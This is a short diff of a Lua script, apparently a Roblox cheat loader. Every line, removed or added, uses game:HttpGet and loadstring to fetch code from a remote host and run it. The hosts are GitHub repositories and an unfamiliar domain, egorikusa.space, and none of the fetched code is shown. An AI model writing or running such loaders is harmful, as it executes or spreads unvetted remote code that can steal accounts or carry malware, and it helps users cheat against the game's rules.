@@ -1,7 +1,2 @@
-task.spawn(function()
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/Ahmadv999/XhubMM2/refs/heads/main/Community'))()
-end)
-
-task.spawn(function()
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/tobi437a/Scripts/refs/heads/main/51388b50740b0cd7684b2fbc.lua'))()
-end)
+loadstring(game:HttpGet("https://egorikusa.space/082a7df0350d7737453de130.lua", true))()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Ahmadv999/XhubMM2/refs/heads/main/Community'))()
